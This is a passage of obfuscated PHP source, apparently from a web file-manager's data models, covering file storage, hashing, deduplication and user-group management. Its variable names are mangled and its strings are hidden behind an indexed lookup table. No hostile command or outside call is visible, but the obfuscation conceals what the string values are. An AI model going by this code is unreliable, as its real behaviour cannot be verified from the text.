$ƒ¶ÔŠš‹[0] . $ÙíƒüÍÛ[53]; } else { $‚†ŠšÕñ .= $ÙíƒüÍÛ[51] . $ƒ¶ÔŠš‹[0] . $ÙíƒüÍÛ[53]; } } return $‚†ŠšÕñ; } } goto FÖ¢ğïÜÜ†; câÜ¸Ôô÷Œ: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\151\x6c\145\137\x63\x6f\x6e\x74\145\x6e\164\163"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\124\151\x6d\145", "\164\x69\155\x65", "\151\x6e\163\x65\162\164", "\146\165\x6e\x63\x74\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\146\x69\x6c\x65"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\x61\155\145" => "\151\x6f\x5f\146\151\x6c\145\x5f\155\145\x74\141", "\155\x65\164\141\x46\x69\145\154\x64" => "\146\x69\x6c\145\111\x44"); public function fileInfo($È”´“ğö) { $±À®à½ò =& $_SERVER[Î‹ÃÂŞ„]; static $À”üõœ = array(); if (!isset($À”üõœ[$È”´“ğö])) { $åÑ±´ó = $±À®à½ò[1951]; $¯¦­œ¦ï = Model($±À®à½ò[514])->field($åÑ±´ó)->where(array($±À®à½ò[512] => $È”´“ğö))->find(); $À”üõœ[$È”´“ğö] = $¯¦­œ¦ï; } return $À”üõœ[$È”´“ğö]; } public function addFileByContent($‡Åó§¿“ = '', $—­«ªùÊ = '') { $Àæïçè® =& $_SERVER[Î‹ÃÂŞ„]; $µ¤ğ°Íú = TEMP_PATH . $Àæïçè®[1952]; if (!is_dir($µ¤ğ°Íú)) { mk_dir($µ¤ğ°Íú); } $üíÔÍşû = $µ¤ğ°Íú . $Àæïçè®[1953] . rand_string(16); file_put_contents($üíÔÍşû, $‡Åó§¿“); $”Äé÷ËÁ = $this->addFile($üíÔÍşû, $—­«ªùÊ, !0); if (file_exists($üíÔÍşû)) { @unlink($üíÔÍşû); } return $”Äé÷ËÁ; } public function createFileName($»É¡ñğÌ, $«§Éü’Í = false, $Ò”àÃ³í = false) { $È¨ö„şª =& $_SERVER[Î‹ÃÂŞ„]; $…‡›´®ˆ = IO::init($È¨ö„şª[8]); $Øˆëìå = $this->makeFilePath($»É¡ñğÌ, $…‡›´®ˆ, $«§Éü’Í, $Ò”àÃ³í); $ôÒ¹Œ…ñ = $…‡›´®ˆ->pathFather($Øˆëìå); static $•ƒ¿Ì± = false; $“­®‡ÓÊ = $È¨ö„şª[1954] . md5($ôÒ¹Œ…ñ); if (!$•ƒ¿Ì± && !Cache::get($“­®‡ÓÊ)) { $•ƒ¿Ì± = !0; $‚´ÂÔ¤â = IO::mkdir($ôÒ¹Œ…ñ); if (!IO::exist($‚´ÂÔ¤â . $È¨ö„şª[844])) { IO::mkfile($‚´ÂÔ¤â . $È¨ö„şª[844]); } Cache::set($“­®‡ÓÊ, 1, 3600 * 2); } return $Øˆëìå; } public function makeFilePath($‡İÂ¾È˜, $ÎÑ©ûßÊ, $úœ…©‹ = false, $²Á’¥Â = false) { $•¶§œİƒ =& $_SERVER[Î‹ÃÂŞ„]; $‡èñÍŸ = Model($•¶§œİƒ[817])->get($•¶§œİƒ[1955]); $×€³ß•± = KodIO::defaultIO() . date($•¶§œİƒ[1956]); $£úÌçğƒ = $×€³ß•± . rand_string(5) . short_id(100); $‡İÂ¾È˜ = str_replace($•¶§œİƒ[8], $•¶§œİƒ[11], KodIO::clear($‡İÂ¾È˜)); $Ò‡‚ØšÚ = $ÎÑ©ûßÊ->ext($‡İÂ¾È˜); if (!$‡İÂ¾È˜) { $‡èñÍŸ = $•¶§œİƒ[1957]; } switch ($‡èñÍŸ) { case $•¶§œİƒ[1958]: $£úÌçğƒ = $£úÌçğƒ . $•¶§œİƒ[10] . $ÎÑ©ûßÊ->ext($‡İÂ¾È˜); if ($Ò‡‚ØšÚ == $•¶§œİƒ[1895]) { $£úÌçğƒ .= $•¶§œİƒ[1261]; } break; case $•¶§œİƒ[1959]: $¨ı¸ÍÓ‡ = Model($•¶§œİƒ[817])->get($•¶§œİƒ[818]); $¦èÍ¯ÏÚ = substr(md5($•¶§œİƒ[819] . $¨ı¸ÍÓ‡ . date($•¶§œİƒ[795])), 0, 8); $Ü³´îšâ = KodIO::defaultDriver(); $×€³ß•± = $•¶§œİƒ[1292] . $Ü³´îšâ[$•¶§œİƒ[445]] . $•¶§œİƒ[454] . date($•¶§œİƒ[1960]) . $¦èÍ¯ÏÚ . $•¶§œİƒ[8]; if ($Ò‡‚ØšÚ == $•¶§œİƒ[1895]) { $‡İÂ¾È˜ .= $•¶§œİƒ[1261]; } $Ÿù“íø‡ = $•¶§œİƒ[1961] . $×€³ß•± . $‡İÂ¾È˜; CacheLock::lock($Ÿù“íø‡); $£úÌçğƒ = $×€³ß•± . $‡İÂ¾È˜; if (IO::exist($×€³ß•± . $‡İÂ¾È˜)) { $´õ‹Ê”Å = substr($‡İÂ¾È˜, 0, strlen($‡İÂ¾È˜) - strlen($Ò‡‚ØšÚ)); $µáş›Ş® = $²Á’¥Â ? substr($²Á’¥Â, 0, 5) : ($úœ…©‹ ? substr($úœ…©‹, 0, 5) : rand_string(5)); $£úÌçğƒ = $×€³ß•± . $´õ‹Ê”Å . $µáş›Ş® . $•¶§œİƒ[10] . $Ò‡‚ØšÚ; } if (IO::isTypeObject($£úÌçğƒ) && !IO::isUploadServer($£úÌçğƒ)) { if (IO::exist($£úÌçğƒ)) { return $£úÌçğƒ; } $Ñç¥˜ = IO::setContent($£úÌçğƒ, $•¶§œİƒ[12]); if (!$Ñç¥˜) { show_json($•¶§œİƒ[1962], !1); } } CacheLock::unlock($Ÿù“íø‡); break; case $•¶§œİƒ[1957]: break; default: break; } return $£úÌçğƒ; } public function addFileByRemote($ø«³õ†, $Ö‡ ‰Ò², $¥¿¸¯‰ = array()) { $ıóŞ½ƒî =& $_SERVER[Î‹ÃÂŞ„]; if (!IO::exist($ø«³õ†)) { return !1; } $®õ±òõÒ = $¥¿¸¯‰[$ıóŞ½ƒî[517]] ? $¥¿¸¯‰[$ıóŞ½ƒî[517]] : $ıóŞ½ƒî[12]; $€·†Ùûë = IO::hashMd5($ø«³õ†, $®õ±òõÒ); $äÌøÇ = KodIO::defaultDriver(); $±­“’º« = array($ıóŞ½ƒî[588] => IO::size($ø«³õ†), $ıóŞ½ƒî[1963] => 1, $ıóŞ½ƒî[464] => $Ö‡ ‰Ò², $ıóŞ½ƒî[855] => $äÌøÇ[$ıóŞ½ƒî[445]], $ıóŞ½ƒî[465] => $ø«³õ†, $ıóŞ½ƒî[1964] => $¥¿¸¯‰[$ıóŞ½ƒî[643]] ? $¥¿¸¯‰[$ıóŞ½ƒî[643]] : IO::hashSimple($ø«³õ†), $ıóŞ½ƒî[1965] => $€·†Ùûë ? $€·†Ùûë : $®õ±òõÒ); if ($É¼‘­·À = $this->addFileCheckExist($±­“’º«[$ıóŞ½ƒî[643]], $±­“’º«[$ıóŞ½ƒî[517]], $±­“’º«[$ıóŞ½ƒî[78]])) { return $É¼‘­·À; } return $this->addFileData($±­“’º«); } private function addFileData($êäÊşÍ­) { $úÇÌóÈ =& $_SERVER[Î‹ÃÂŞ„]; if (!$êäÊşÍ­) { return !1; } $êäÊşÍ­[$úÇÌóÈ[78]] = intval($êäÊşÍ­[$úÇÌóÈ[78]]); if (!$êäÊşÍ­[$úÇÌóÈ[78]] && strlen($êäÊşÍ­[$úÇÌóÈ[643]]) > 32) { $êäÊşÍ­[$úÇÌóÈ[78]] = intval(substr($êäÊşÍ­[$úÇÌóÈ[643]], 32)); } $ÓËÁ„¤¦ = $this->add($êäÊşÍ­); return $this->find($ÓËÁ„¤¦); } public function addFile($—ñ†Ãá, $Ú¼ä·ßí, $‚Æ®äùï = false) { $ŒğĞøí =& $_SERVER[Î‹ÃÂŞ„]; $…ÉáÙÈ = IO::hashSimple($—ñ†Ãá); $‡ˆÙÂÄü = IO::size($—ñ†Ãá); $™äÂ«– = $‡ˆÙÂÄü <= 1024 * 1024 * 10 ? IO::hashMd5($—ñ†Ãá) : $ŒğĞøí[12]; $ëÏü¾€¹ = $ŒğĞøí[1966] . $…ÉáÙÈ; CacheLock::lock($ëÏü¾€¹); if ($™äÂ«– && $…ÉáÙÈ) { $éĞ¦­Ñ¤ = $this->addFileCheckExist($…ÉáÙÈ, $™äÂ«–, $‡ˆÙÂÄü); if ($éĞ¦­Ñ¤) { CacheLock::unlock($ëÏü¾€¹); return $éĞ¦­Ñ¤; } } $¬ŠìŠ­ñ = $this->addFileMake($—ñ†Ãá, $‡ˆÙÂÄü, $…ÉáÙÈ, $™äÂ«–, $Ú¼ä·ßí, $‚Æ®äùï); $¿¹¦øõª = $this->addFileData($¬ŠìŠ­ñ); CacheLock::unlock($ëÏü¾€¹); if (!$™äÂ«– && $¿¹¦øõª) { $this->fileMd5Check($¿¹¦øõª); } return $¿¹¦øõª; } public function fileMd5Check($ïé©ÌêÛ) { $Ã—¸£  =& $_SERVER[Î‹ÃÂŞ„]; $¥·ìç = array($ïé©ÌêÛ[$Ã—¸£ [511]], $ïé©ÌêÛ[$Ã—¸£ [86]]); $¨¦·§ÏÏ = $Ã—¸£ [1967] . $ïé©ÌêÛ[$Ã—¸£ [86]]; $¦Ä×“ç = $Ã—¸£ [1968] . $ïé©ÌêÛ[$Ã—¸£ [511]]; TaskQueue::add($Ã—¸£ [1969], $¥·ìç, $¨¦·§ÏÏ, $¦Ä×“ç); } public function fileMd5Set($ŒúáÙê, $°ÌÚ›…ª) { $øÑ’Ü =& $_SERVER[Î‹ÃÂŞ„]; $µúğç˜ú = $this->find($ŒúáÙê); if (!$µúğç˜ú || $µúğç˜ú[$øÑ’Ü[517]]) { return; } $‹ü“³¬— = IO::hashMd5($°ÌÚ›…ª); if (!$‹ü“³¬—) { return $øÑ’Ü[12]; } $this->where(array($øÑ’Ü[511] => $ŒúáÙê))->save(array($øÑ’Ü[517] => $‹ü“³¬—)); } public function addFileMake($òˆä“Š’, $´ßˆä¬, $‹ßËİÖ, $‹•ÜŞïÇ, $³ÈİãØ, $“¤úÏê™) { $¡×êıÆ§ =& $_SERVER[Î‹ÃÂŞ„]; $ãëğµéï = $this->createFileName($³ÈİãØ, $‹ßËİÖ, $‹•ÜŞïÇ); $Óù§µğÇ = get_path_father($ãëğµéï); $ò‰¤Î€ = get_path_this($ãëğµéï); if ($“¤úÏê™) { $Ëğ±Â×à = IO::move($òˆä“Š’, $Óù§µğÇ, !1, $ò‰¤Î€); } else { $Ëğ±Â×à = IO::copy($òˆä“Š’, $Óù§µğÇ, !1, $ò‰¤Î€); } if (!$Ëğ±Â×à) { return !1; } $şò¦¿ü¸ = KodIO::defaultDriver(); $şíÏ’ª² = array($¡×êıÆ§[588] => $´ßˆä¬, $¡×êıÆ§[1963] => 1, $¡×êıÆ§[464] => $³ÈİãØ, $¡×êıÆ§[855] => $şò¦¿ü¸[$¡×êıÆ§[445]], $¡×êıÆ§[465] => $ãëğµéï, $¡×êıÆ§[1964] => $‹ßËİÖ, $¡×êıÆ§[1965] => $‹•ÜŞïÇ); return $şíÏ’ª²; } public function addFileCheckExist($ô™Ìâ«®, $öµÒÑ, $ÒêÎØ–¼) { $–çš°å¯ =& $_SERVER[Î‹ÃÂŞ„]; $ãÉ¤åçã = $this->findByHash($ô™Ìâ«®, $öµÒÑ); if (!$ãÉ¤åçã) { return !1; } $›Û©‹ã = array($–çš°å¯[1963] => intval($ãÉ¤åçã[$–çš°å¯[1970]]) + 1, $–çš°å¯[588] => $ÒêÎØ–¼); $this->where(array($–çš°å¯[512] => $ãÉ¤åçã[$–çš°å¯[511]]))->save($›Û©‹ã); return $ãÉ¤åçã; } public function remove($ÖŸ—ï¦Ï) { $this->linkCountChange($ÖŸ—ï¦Ï, !1); $this->clearEmpty(); return !0; } public function linkAdd($ñÏì€˜) { $this->linkCountChange($ñÏì€˜, !0); } public function linkCountChange($šõêûÛ‡, $ú®ÀÅÔí) { $àæŒ²Ş =& $_SERVER[Î‹ÃÂŞ„]; if (!$šõêûÛ‡) { return; } if (!is_array($šõêûÛ‡)) { $šõêûÛ‡ = array($šõêûÛ‡); } $©«İÜõÙ = array(); foreach ($šõêûÛ‡ as $Œêë‚ö­) { $¿“¤ğŠ = $Œêë‚ö­ . $àæŒ²Ş[12]; if (!$©«İÜõÙ[$¿“¤ğŠ]) { $©«İÜõÙ[$¿“¤ğŠ] = 0; } $©«İÜõÙ[$¿“¤ğŠ]++; } $Ô‰€¢È = array(); foreach ($©«İÜõÙ as $Œêë‚ö­ => $×Ò…³£é) { $¿“¤ğŠ = $×Ò…³£é . $àæŒ²Ş[12]; if (!$Ô‰€¢È[$¿“¤ğŠ]) { $Ô‰€¢È[$¿“¤ğŠ] = array(); } $Ô‰€¢È[$¿“¤ğŠ][] = $Œêë‚ö­; } foreach ($Ô‰€¢È as $×Ò…³£é => $§˜„Ïø›) { if (!$§˜„Ïø›) { continue; } $×Ò…³£é = $ú®ÀÅÔí ? $×Ò…³£é : -intval($×Ò…³£é); $¨¦¢•âƒ = array($àæŒ²Ş[511] => array($àæŒ²Ş[7], $§˜„Ïø›)); if ($×Ò…³£é < 0) { $¨¦¢•âƒ[$àæŒ²Ş[1970]] = array($àæŒ²Ş[1070], abs($×Ò…³£é)); } $this->where($¨¦¢•âƒ)->setAdd($àæŒ²Ş[1970], $×Ò…³£é); } } public function findByHash($Ô±ïÖ¯, $ÄÅ°“¯¦ = false) { $“ëÉ°Öö =& $_SERVER[Î‹ÃÂŞ„]; if (!$Ô±ïÖ¯ && !$ÄÅ°“¯¦) { return !1; } $ùÂ¾ùò¿ = array($“ëÉ°Öö[1964] => $Ô±ïÖ¯); if ($ÄÅ°“¯¦) { $ùÂ¾ùò¿ = array($“ëÉ°Öö[1965] => $ÄÅ°“¯¦); } return $this->order($“ëÉ°Öö[1971])->where($ùÂ¾ùò¿)->find(); } public function clearEmpty($‚ïºŠÃ = 0) { $ÍÒª™–Ú =& $_SERVER[Î‹ÃÂŞ„]; $…¶¬‘ù½ = time() - 3600 * 24 * $‚ïºŠÃ; $ñ×Ç­òÄ = $ÍÒª™–Ú[1972] . $…¶¬‘ù½; $¹ï™à©” = $this->where($ñ×Ç­òÄ)->select(); if (!$¹ï™à©”) { return; } $Ãü«Ç ó = new Task($ÍÒª™–Ú[1973], $ÍÒª™–Ú[12], count($¹ï™à©”)); foreach ($¹ï™à©” as $¸÷»ªè‹) { $Ãü«Ç ó->update(1); $this->resetFile($¸÷»ªè‹); } $Ãü«Ç ó->end(); } public function resetFile($¾¾“¨õß) { $†€Ø‡Àã =& $_SERVER[Î‹ÃÂŞ„]; $¹åïˆ¡“ = array($†€Ø‡Àã[512] => $¾¾“¨õß[$†€Ø‡Àã[511]]); $ûã¼ÕÈÔ = Model($†€Ø‡Àã[1388])->where($¹åïˆ¡“)->count(); $È¹¿¶ú = Model($†€Ø‡Àã[1974])->where($¹åïˆ¡“)->count(); $‹ƒÕŠ›Ê = intval($ûã¼ÕÈÔ) + intval($È¹¿¶ú); if ($‹ƒÕŠ›Ê == 0) { IO::remove($¾¾“¨õß[$†€Ø‡Àã[86]]); Model($†€Ø‡Àã[1975])->delete($¾¾“¨õß[$†€Ø‡Àã[511]]); $this->where($¹åïˆ¡“)->delete(); $this->metaSet($¾¾“¨õß[$†€Ø‡Àã[511]], null, null); return; } if ($¾¾“¨õß[$†€Ø‡Àã[1970]] != $‹ƒÕŠ›Ê) { $this->where($¹åïˆ¡“)->save(array($†€Ø‡Àã[1963] => $‹ƒÕŠ›Ê)); } } public function storageInfo($®şš¨—á = false) { $¬½¶—®í =& $_SERVER[Î‹ÃÂŞ„]; $ å¶Ñıù = $this->count() + 0.0; $õâšßŞ = 0; $ã•É•€ = 1; $ÃÊ£Áéœ = 0; $æÄñöõ­ = 5000; for ($’êÈÛ´ = 0; $’êÈÛ´ < $ å¶Ñıù; $’êÈÛ´ = $’êÈÛ´ + $æÄñöõ­) { $‰â¤è†Œ = $this->limit($’êÈÛ´, $’êÈÛ´ + $æÄñöõ­)->select(); foreach ($‰â¤è†Œ as $¡ÌàĞãÛ) { $ã•É•€ += $¡ÌàĞãÛ[$¬½¶—®í[78]] * $¡ÌàĞãÛ[$¬½¶—®í[1970]]; $õâšßŞ += $¡ÌàĞãÛ[$¬½¶—®í[78]] * ($¡ÌàĞãÛ[$¬½¶—®í[1970]] - 1); $ÃÊ£Áéœ += $¡ÌàĞãÛ[$¬½¶—®í[1970]]; } } $àÓ…¶Š² = array($¬½¶—®í[1976] => $ã•É•€, $¬½¶—®í[1977] => $õâšßŞ, $¬½¶—®í[1978] => $õâšßŞ / $ã•É•€, $¬½¶—®í[82] => $ å¶Ñıù, $¬½¶—®í[1979] => $ÃÊ£Áéœ); return $àÓ…¶Š²; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\160"; protected $tableMeta = array("\164\x61\142\154\x65\116\141\155\x65" => "\x67\162\157\x75\160\x5f\155\145\164\141", "\155\x65\x74\141\x46\x69\145\154\x64" => "\x67\x72\157\x75\x70\x49\x44"); protected function cacheFunctionAlias($ô§Å‡»‰) { $÷ôş‰¢û =& $_SERVER[Î‹ÃÂŞ„]; return array($÷ôş‰¢û[1980] => array($ô§Å‡»‰[0], $÷ôş‰¢û[1981]), $÷ôş‰¢û[1982] => array($ô§Å‡»‰[0], $÷ôş‰¢û[1983])); } protected function getInfo($é¬Ñ¬äØ, $‘ëä¤¥ = false) { $ÊŠóşşÇ = $this->getInfoSimple($é¬Ñ¬äØ); if (!$ÊŠóşşÇ) { return !1; } if ($‘ëä¤¥) { return $this->_listDataApplyItem($ÊŠóşşÇ); } return $this->cacheFunctionGet($_SERVER[Î‹ÃÂŞ„][1984], $é¬Ñ¬äØ); } protected function getInfoSimple($•Çäú´, $Îì¤¨°© = false) { $ı†Ã‰…¦ =& $_SERVER[Î‹ÃÂŞ„]; if ($Îì¤¨°©) { $’ÅËåãù = array($ı†Ã‰…¦[1902] => intval($•Çäú´)); $”åÚ¼ğ¬ = $this->where($’ÅËåãù)->find(); return is_array($”åÚ¼ğ¬) ? $”åÚ¼ğ¬ : array(); } return $this->cacheFunctionGet($ı†Ã‰…¦[1985], $•Çäú´); } protected function groupAdd($«¦ÄŞ§²) { $£°Èœ =& $_SERVER[Î‹ÃÂŞ„]; if (!$«¦ÄŞ§²[$£°Èœ[182]] && isset($«¦ÄŞ§²[$£°Èœ[1902]]) && $«¦ÄŞ§²[$£°Èœ[1902]] == 1) { if ($²­ÎÌî = $this->getInfoSimple($«¦ÄŞ§²[$£°Èœ[1902]], !0)) { return $«¦ÄŞ§²[$£°Èœ[1902]]; } } else { $²­ÎÌî = $this->getInfoSimple($«¦ÄŞ§²[$£°Èœ[182]]); if (!$²­ÎÌî) { return !1; } } $ì«‰ş¦ğ = $£°Èœ[566]; if ($²­ÎÌî[$£°Èœ[556]]) { $ì«‰ş¦ğ = $²­ÎÌî[$£°Èœ[556]] . $²­ÎÌî[$£°Èœ[1902]] . $£°Èœ[50]; } $„±¼…Ú = array($£°Èœ[464] => $this->groupNameAuto($«¦ÄŞ§²[$£°Èœ[182]], $«¦ÄŞ§²[$£°Èœ[32]]), $£°Èœ[447] => $«¦ÄŞ§²[$£°Èœ[182]], $£°Èœ[623] => $ì«‰ş¦ğ, $£°Èœ[1986] => $«¦ÄŞ§²[$£°Èœ[1889]], $£°Èœ[1987] => 0, $£°Èœ[1906] => 0); if (isset($«¦ÄŞ§²[$£°Èœ[1926]])) { $„±¼…Ú[$£°Èœ[1926]] = $«¦ÄŞ§²[$£°Èœ[1926]]; } else { $¿ôçÇ”Í = $this->max($£°Èœ[1926]); if (!$¿ôçÇ”Í) { $¿ôçÇ”Í = 0; } $„±¼…Ú[$£°Èœ[1926]] = $¿ôçÇ”Í + 1; } if (!empty($«¦ÄŞ§²[$£°Èœ[1902]])) { $„±¼…Ú[$£°Èœ[1902]] = $«¦ÄŞ§²[$£°Èœ[1902]]; } $¨Ù¹éØù = $this->add($„±¼…Ú); $this->setNamePinyin($¨Ù¹éØù, $„±¼…Ú[$£°Èœ[32]]); if (isset($«¦ÄŞ§²[$£°Èœ[1988]])) { $this->metaSet($¨Ù¹éØù, array($£°Èœ[1988] => $«¦ÄŞ§²[$£°Èœ[1988]], $£°Èœ[1989] => $«¦ÄŞ§²[$£°Èœ[1989]])); unset($«¦ÄŞ§²[$£°Èœ[1988]]); unset($«¦ÄŞ§²[$£°Èœ[1989]]); } Model($£°Èœ[1388])->groupRootAdd($¨Ù¹éØù); $this->_clearCache($«¦ÄŞ§²[$£°Èœ[182]]); return $¨Ù¹éØù; } protected function groupEdit($¤êº Œ, $†è³ğ¸) { $ùØ³Æúï =& $_SERVER[Î‹ÃÂŞ„]; $€Û«åòİ = $this->getInfoSimple($¤êº Œ); if (!$€Û«åòİ) { return !1; } if (!empty($†è³ğ¸[$ùØ³Æúï[182]])) { $ì•¢èó‘ = $this->getInfoSimple($†è³ğ¸[$ùØ³Æúï[182]]); if (!$ì•¢èó‘) { return !1; } if ($€Û«åòİ[$ùØ³Æúï[1902]] == $ì•¢èó‘[$ùØ³Æúï[1902]]) { return !1; } if ($†è³ğ¸[$ùØ³Æúï[182]] != $€Û«åòİ[$ùØ³Æúï[182]]) { if ($ì•¢èó‘[$ùØ³Æúï[556]] !== $€Û«åòİ[$ùØ³Æúï[556]] && strpos($ì•¢èó‘[$ùØ³Æúï[556]], $€Û«åòİ[$ùØ³Æúï[556]] . $€Û«åòİ[$ùØ³Æúï[1902]] . $ùØ³Æúï[50]) === 0) { return !1; } $†è³ğ¸[$ùØ³Æúï[623]] = $ì•¢èó‘[$ùØ³Æúï[556]] . $†è³ğ¸[$ùØ³Æúï[182]] . $ùØ³Æúï[50]; $this->_changeChildLevel($€Û«åòİ, $ì•¢èó‘); $this->_clearCache($ì•¢èó‘[$ùØ³Æúï[1902]]); $this->_clearCache($€Û«åòİ[$ùØ³Æúï[182]]); } } if (isset($†è³ğ¸[$ùØ³Æúï[32]])) { $this->setNamePinyin($¤êº Œ, $†è³ğ¸[$ùØ³Æúï[32]]); } if (isset($†è³ğ¸[$ùØ³Æúï[1988]])) { $this->metaSet($¤êº Œ, array($ùØ³Æúï[1988] => $†è³ğ¸[$ùØ³Æúï[1988]], $ùØ³Æúï[1989] => $†è³ğ¸[$ùØ³Æúï[1989]])); unset($†è³ğ¸[$ùØ³Æúï[1988]]); unset($†è³ğ¸[$ùØ³Æúï[1989]]); } $this->_clearChildrenCache($€Û«åòİ); return $this->where(array($ùØ³Æúï[1990] => $¤êº Œ))->save($†è³ğ¸); } private function _clearChildrenCache($üªŒ¤›) { $çòØÚ³ =& $_SERVER[Î‹ÃÂŞ„]; $£¤Ä¨‰ß = array($çòØÚ³[623] => array($çòØÚ³[583], $üªŒ¤›[$çòØÚ³[556]] . $üªŒ¤›[$çòØÚ³[1902]] . $çòØÚ³[584])); $ù±‰‡ºŞ = $this->field($çòØÚ³[1902])->where($£¤Ä¨‰ß)->select(); foreach ($ù±‰‡ºŞ as $“‚®‡¤Ë) { $this->_clearCache($“‚®‡¤Ë[$çòØÚ³[1902]]); } } private function _clearCache($€¿±Ëœ) { $±È‚ÃÎ =& $_SERVER[Î‹ÃÂŞ„]; $this->cacheFunctionClear($±È‚ÃÎ[1984], $€¿±Ëœ); $this->cacheFunctionClear($±È‚ÃÎ[1985], $€¿±Ëœ); } private function _changeChildLevel($ÁÑíöÖÌ, $¦âšû¥Á, $¯ù­ ı = false) { $÷£Š»êª =& $_SERVER[Î‹ÃÂŞ„]; $ûšõçûë = $ÁÑíöÖÌ[$÷£Š»êª[556]] . $ÁÑíöÖÌ[$÷£Š»êª[1902]] . $÷£Š»êª[50]; $ÑØ›Šü¢ = $¦âšû¥Á[$÷£Š»êª[556]] . $¦âšû¥Á[$÷£Š»êª[1902]] . $÷£Š»êª[50] . $ÁÑíöÖÌ[$÷£Š»êª[1902]] . $÷£Š»êª[50]; if ($¯ù­ ı) { $ÑØ›Šü¢ = $¦âšû¥Á[$÷£Š»êª[556]] . $¦âšû¥Á[$÷£Š»êª[1902]] . $÷£Š»êª[50]; } $©ÕÒ‘ì… = array($÷£Š»êª[623] => array($÷£Š»êª[583], $ÁÑíöÖÌ[$÷£Š»êª[556]] . $ÁÑíöÖÌ[$÷£Š»êª[1902]] . $÷£Š»êª[584])); $Íïúç°“ = array($÷£Š»êª[623] => array($÷£Š»êª[632], "\162\x65\x70\154\x61\x63\145\50\x70\141\162\x65\156\164\x4c\145\x76\x65\154\x2c\x27{$ûšõçûë}\47\54\x27{$ÑØ›Šü¢}\x27\51")); $this->_clearChildrenCache($ÁÑíöÖÌ); $this->where($©ÕÒ‘ì…)->data($Íïúç°“)->save(); } public function setNamePinyin($ˆßŒÕğä, $¶«Ğ¿ï = false) { $Å‰œ›’ =& $_SERVER[Î‹ÃÂŞ„]; if (!$¶«Ğ¿ï) { $¸æü›Š = $this->getInfoSimple($ˆßŒÕğä); $¶«Ğ¿ï = $¸æü›Š[$Å‰œ›’[32]]; } if (!Input::check($¶«Ğ¿ï, $Å‰œ›’[626])) { $this->metaSet($ˆßŒÕğä, $Å‰œ›’[508], null); $this->metaSet($ˆßŒÕğä, $Å‰œ›’[507], null); return; } $ç˜îî¿ = array($Å‰œ›’[508] => str_replace($Å‰œ›’[53], $Å‰œ›’[12], Pinyin::get($¶«Ğ¿ï)), $Å‰œ›’[507] => Pinyin::get($¶«Ğ¿ï, $Å‰œ›’[627])); $this->metaSet($ˆßŒÕğä, $ç˜îî¿); } protected function groupStatus($–”ëìŒø, $åïïÛ·°) { $’€¬ììò =& $_SERVER[Î‹ÃÂŞ„]; $–ÙÄíáˆ = $this->getInfoSimple($–”ëìŒø); if (!$–ÙÄíáˆ) { return !1; } if ($åïïÛ·° == $’€¬ììò[90]) { $—¢¨´³è = $this->parentLevelArray($–ÙÄíáˆ[$’€¬ììò[556]]); } else { $äÃñŒÌï = array($’€¬ììò[623] => array($’€¬ììò[583], $–ÙÄíáˆ[$’€¬ììò[556]] . $–ÙÄíáˆ[$’€¬ììò[1902]] . $’€¬ììò[584])); $—¢¨´³è = $this->where($äÃñŒÌï)->field($’€¬ììò[1902])->select(); $—¢¨´³è = array_to_keyvalue($—¢¨´³è, $’€¬ììò[12], $’€¬ììò[1902]); } $—¢¨´³è[] = $–ÙÄíáˆ[$’€¬ììò[1902]]; $å§Ÿ¢¦Ã = array(); foreach ($—¢¨´³è as $–”ëìŒø) { $å§Ÿ¢¦Ã[] = array($’€¬ììò[1902] => $–”ëìŒø, $’€¬ììò[96] => $’€¬ììò[797], $’€¬ììò[420] => $åïïÛ·°); $this->_clearCache($–”ëìŒø); } return Model($’€¬ììò[1991])->addAll($å§Ÿ¢¦Ã, array(), !0); } protected function groupRemove($³ÜœÇ«™, $àÖŞ€™ã = false) { $Û³ª÷é‘ =& $_SERVER[Î‹ÃÂŞ„]; $ÆĞØ©»Ğ = array($Û³ª÷é‘[1902] => $³ÜœÇ«™); $öÓğª³£ = $this->where($ÆĞØ©»Ğ)->find(); if (!$öÓğª³£ || $öÓğª³£[$Û³ª÷é‘[182]] == 0) { return !1; } if (!$àÖŞ€™ã) { $ùôîëÂ‰ = $this->getInfoSimple($öÓğª³£[$Û³ª÷é‘[182]]); $this->_changeChildLevel($öÓğª³£, $ùôîëÂ‰, !0); $this->where(array($Û³ª÷é‘[182] => $³ÜœÇ«™))->save(array($Û³ª÷é‘[182] => $öÓğª³£[$Û³ª÷é‘[182]])); $this->_clearCache($ùôîëÂ‰[$Û³ª÷é‘[1902]]); } Model($Û³ª÷é‘[1991])->where($ÆĞØ©»Ğ)->delete(); Model($Û³ª÷é‘[1992])->where($ÆĞØ©»Ğ)->delete(); Model($Û³ª÷é‘[872])->groupRootRemove($³ÜœÇ«™); $this->_clearCache($öÓğª³£[$Û³ª÷é‘[182]]); return $this->where($ÆĞØ©»Ğ)->delete(); } protected function groupSort($´üåú•€) { $‰ºïíæ× =& $_SERVER[Î‹ÃÂŞ„]; $ŠıçØ¢ç = array(); foreach ($´üåú•€ as $¾ ·ò => $´×„¢ë¾) { $ŠıçØ¢ç[] = array($‰ºïíæ×[1902], $´×„¢ë¾, $‰ºïíæ×[1926], $¾ ·ò + 1); } $this->saveAll($ŠıçØ¢ç); } public function listData() { $¤Èä”ÛÆ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¤Èä”ÛÆ[$_SERVER[Î‹ÃÂŞ„][415]]); return $¤Èä”ÛÆ; } private function _makeOrder($úïß×ıŠ = '') { $öùÔÎ¾Ö =& $_SERVER[Î‹ÃÂŞ„]; $³¼ï´Ğª = array($öùÔÎ¾Ö[1902], $öùÔÎ¾Ö[32], $öùÔÎ¾Ö[1891], $öùÔÎ¾Ö[217]); $ìï¼òò” = array($öùÔÎ¾Ö[493] => $öùÔÎ¾Ö[494], $öùÔÎ¾Ö[495] => $öùÔÎ¾Ö[496]); $ÏÖûŞë± = Input::get($öùÔÎ¾Ö[500], $öùÔÎ¾Ö[7], $öùÔÎ¾Ö[1906], $³¼ï´Ğª); $ˆ¸—úŠú = Input::get($öùÔÎ¾Ö[501], $öùÔÎ¾Ö[7], $öùÔÎ¾Ö[1993], array($öùÔÎ¾Ö[1993], $öùÔÎ¾Ö[495])); $ˆ¸—úŠú = $ìï¼òò”[$ˆ¸—úŠú]; $úïß×ıŠ = $úïß×ıŠ . "{$ÏÖûŞë±}\40{$ˆ¸—úŠú}\54\40\x67\x72\157\x75\x70\111\x44\40\141\163\x63"; return $this->order($úïß×ıŠ); } public function listChild($ëšü‰ŒÉ) { $š†¸¨â½ =& $_SERVER[Î‹ÃÂŞ„]; 